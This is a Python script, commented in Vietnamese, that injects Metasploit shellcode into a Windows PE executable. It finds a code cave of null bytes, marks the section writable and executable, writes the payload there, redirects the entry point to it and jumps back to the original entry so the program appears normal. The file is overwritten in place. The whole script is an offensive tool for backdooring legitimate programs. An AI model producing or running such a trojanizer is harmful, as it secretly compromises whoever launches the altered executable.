import sys
import pefile
import argparse
import re

file_path = r'C:\metasploit-framework\bin\payload.py'

# Đọc shellcode từ file
with open(file_path, 'r') as file:
    lines = file.readlines()

output = ''
for line in lines:
    if line.startswith("#") or not line.strip():
        continue
    hex_bytes = line.strip("buf += ")
    if hex_bytes:
        output += hex_bytes
cleaned_output = re.sub(r'[^0-9a-fA-F]', '', output)
shellcode = bytes.fromhex(cleaned_output)

parser = argparse.ArgumentParser()
parser.add_argument('--file', '-f', dest='file', required=True,
                    help='Đường dẫn đến tệp PE để tiêm shellcode.')
args = parser.parse_args()

# Hàm tìm vùng trống
def find_cave(pe, min_cave_size):
    image_base = pe.OPTIONAL_HEADER.ImageBase
    for section in pe.sections:
        if section.SizeOfRawData == 0:
            continue
        position = 0
        count = 0
        data = section.get_data()
        for byte in data:
            if byte == 0x00:
                count += 1
            else:
                if count >= min_cave_size:
                    raw_offset = section.PointerToRawData + position - count
                    virtual_address = image_base + section.VirtualAddress + position - count
                    section.Characteristics |= 0xE0000040
                    return virtual_address, raw_offset
                count = 0
            position += 1
    return None

file = args.file
try:
    pe = pefile.PE(file)
except FileNotFoundError:
    sys.exit(f"Lỗi: Tệp '{file}' không tìm thấy.")
except Exception as e:
    sys.exit(f"Lỗi: Không thể tải tệp PE. {e}")

min_cave_size = len(shellcode) + 20
cave = find_cave(pe, min_cave_size)

if not cave:
    sys.exit("Lỗi: Không tìm thấy vùng trống đủ lớn.")
new_entry_point, raw_offset = cave

# Lấy địa chỉ EntryPoint gốc
original_entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint
original_entry_address = (original_entry_point + pe.OPTIONAL_HEADER.ImageBase).to_bytes(4, 'little')

# Shellcode nhảy về EntryPoint gốc sau khi chạy xong
shellcode += b"\xB8" + original_entry_address + b"\xFF\xE0"

# Tiêm shellcode vào tệp PE
pe.set_bytes_at_offset(raw_offset, shellcode)

# Cập nhật EntryPoint mới
pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_entry_point - pe.OPTIONAL_HEADER.ImageBase

# Lưu tệp PE đã sửa
output_file = f"{file}"
try:
    pe.write(output_file)
    print(f"Tệp đã được sửa thành công: {output_file}")
except Exception as e:
    sys.exit(f"Lỗi: Không thể lưu tệp đã sửa. {e}")

pe.close()
print("Quá trình hoàn tất thành công.")
